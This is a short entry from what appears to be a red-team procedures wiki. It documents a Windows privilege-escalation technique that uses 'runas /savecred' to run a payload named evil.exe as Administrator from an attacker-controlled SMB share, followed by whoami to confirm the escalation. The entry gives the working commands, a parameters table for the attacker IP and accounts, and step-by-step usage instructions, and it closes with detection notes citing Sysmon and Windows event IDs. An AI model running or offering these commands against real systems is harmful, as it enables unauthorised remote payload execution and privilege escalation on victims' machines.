---
id: 6c716698-dc5c-4cd7-8cfc-d66d3a6794e8
name: runas-savecred-execute-evil-exe-and-whoami
type: code
language: cmd
verified: true
created_at: '2023-04-06T03:56:29.949832+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - payload-execution
validated: true
---

# runas-savecred-execute-evil-exe-and-whoami

## Code

```cmd
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
runas /savecred /user:Administrator "cmd.exe /k whoami"
```

## Description

This code snippet uses `runas /savecred` to execute a malicious executable (`evil.exe`) from a remote share as a local administrator and then verifies the privilege level by running `whoami` in a new command prompt. It stores credentials after the first password prompt for reuse.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 10.XXX.XXX.XXX | Attacker's IP hosting the share | 192.168.1.100 |
| WORKGROUP\Administrator | Local admin account | DOMAIN\Admin |
| Administrator | Alternative local admin username | .

## Usage

Stage `evil.exe` on an attacker-controlled SMB share. Execute from a low-priv shell on the target. First run prompts for password and executes the payload as admin; second confirms escalation. Useful after obtaining creds for initial escalation to shell or persistence.

## Detection

- Monitor for `runas.exe` spawns with `/savecred` via Sysmon Event ID 1 (Process Creation).
- Audit SMB share access (Event ID 5145) and credential additions (Event ID 4657).
- Network logs showing connections to internal shares from unexpected hosts.
- Process tree: `runas.exe` parent to suspicious binaries like custom EXEs.

## Related

- [[procedures/windows-privilege-escalation-via-runas]]
- [[tools/Netcat]]
